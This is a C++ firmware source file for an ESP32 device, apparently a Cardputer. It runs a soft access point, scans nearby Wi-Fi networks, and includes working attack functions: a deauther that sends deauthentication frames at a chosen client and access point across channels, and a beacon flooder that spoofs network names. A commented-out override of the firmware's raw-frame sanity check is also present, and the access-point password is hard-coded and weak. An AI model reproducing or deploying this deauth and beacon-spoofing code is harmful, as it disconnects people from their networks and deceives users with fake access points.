extern "C" {
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "nvs_flash.h"

#include "configure_wifi.h"

#include "lwip/err.h"
#include "lwip/sys.h"
}

#include <Arduino.h>
#include "packet.hpp"
#include <cstring>

#define WIFI_CHANNEL 1
#define MAX_STA_CONN 4
#define MAX_APs 20

const char *WIFI_SSID = "NameZero";
const char *WIFI_PASS = "12345678";

int ssidsCount = 32;

PacketSender sender;

char ssids_networks[] = {};

static const char *wifiManagerTAG = "Wi-Fi Manager";

typedef struct {
    char ssid[33];
    int rssi;
    int channel;
    uint8_t mac[6];
} wifi_ap_data_t;

wifi_ap_data_t wifi_aps[MAX_APs];

uint16_t wifi_ap_count = 0;

static void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        auto* event = static_cast<wifi_event_ap_staconnected_t*>(event_data);
        Serial.printf(wifiManagerTAG, "Station " MACSTR " joined, AID=%d", MAC2STR(event->mac), event->aid);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        auto* event = static_cast<wifi_event_ap_stadisconnected_t*>(event_data);
        Serial.printf(wifiManagerTAG, "Station " MACSTR " left, AID=%d", MAC2STR(event->mac), event->aid);
    }
}

/*
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}*/

extern "C" int lwip_hook_ip6_input(void *arg) {  // For Cardputer
    return 0;
}

void wifi_start() {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&wifi_cfg));
}

void wifi_init_softap() {
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, nullptr, nullptr));

    wifi_config_t wifi_config = {};
    std::strncpy(reinterpret_cast<char*>(wifi_config.ap.ssid), WIFI_SSID, sizeof(wifi_config.ap.ssid));
    wifi_config.ap.ssid_len = strlen(WIFI_SSID);
    wifi_config.ap.channel = WIFI_CHANNEL;
    std::strncpy(reinterpret_cast<char*>(wifi_config.ap.password), WIFI_PASS, sizeof(wifi_config.ap.password));
    wifi_config.ap.max_connection = MAX_STA_CONN;
    wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK;

    if (strlen(WIFI_PASS) == 0) {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    Serial.printf("Wi-Fi AP started. SSID: %s, Password: %s, Channel: %d\n", WIFI_SSID, WIFI_PASS, WIFI_CHANNEL);
}

void wifi_scan(void) {
    esp_netif_t *sta_netif = esp_netif_create_default_wifi_sta();
    assert(sta_netif);

    uint16_t number = MAX_APs;
    wifi_ap_record_t ap_info[MAX_APs];
    memset(ap_info, 0, sizeof(ap_info));


    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    esp_wifi_scan_start(NULL, true);

    ESP_LOGI(wifiManagerTAG, "Max AP number ap_info can hold = %u", number);
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&wifi_ap_count));
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&number, ap_info));
    ESP_LOGI(wifiManagerTAG, "Total APs scanned = %u, actual AP number ap_info holds = %u", wifi_ap_count, number);
    for (int i = 0; i < number; i++) {
        strncpy(wifi_aps[i].ssid, (char*)ap_info[i].ssid, 32);
        wifi_aps[i].ssid[32] = '\0';

        wifi_aps[i].rssi = ap_info[i].rssi;
        wifi_aps[i].channel = ap_info[i].primary;
        memcpy(wifi_aps[i].mac, ap_info[i].bssid, 6);

        printf("SSID: %s, RSSI: %d, Channel: %d, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
            wifi_aps[i].ssid, wifi_aps[i].rssi, wifi_aps[i].channel,
            wifi_aps[i].mac[0], wifi_aps[i].mac[1], wifi_aps[i].mac[2],
            wifi_aps[i].mac[3], wifi_aps[i].mac[4], wifi_aps[i].mac[5]);

    }
    esp_netif_destroy_default_wifi(sta_netif);
    ESP_ERROR_CHECK(esp_wifi_stop());
}

void wifi_start_deauther(const MacAddr target, const MacAddr ap) {
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Init dummy AP to specify a channel and get WiFi hardware into
    // a mode where we can send the actual fake beacon frames.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, ap));

    ESP_ERROR_CHECK(esp_deauther_configure_wifi(1));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    for(uint8_t ch = 1; ch < 11; ch++) {
        printf("Deauthing channel %d\n", ch);
        esp_err_t res;
        res = sender.deauth(target, ap, ap, 1, ch);
        if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
    }
}

void wifi_start_beacon(const char ssid[], int count, uint8_t channel, bool wpa2) {
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());

    for (int i = 0; i < count; i++) {
        ESP_ERROR_CHECK(sender.beacon(ssid, channel, wpa2));
        channel = (channel % 11) + 1; // Переключение канала (1-11)
    }
}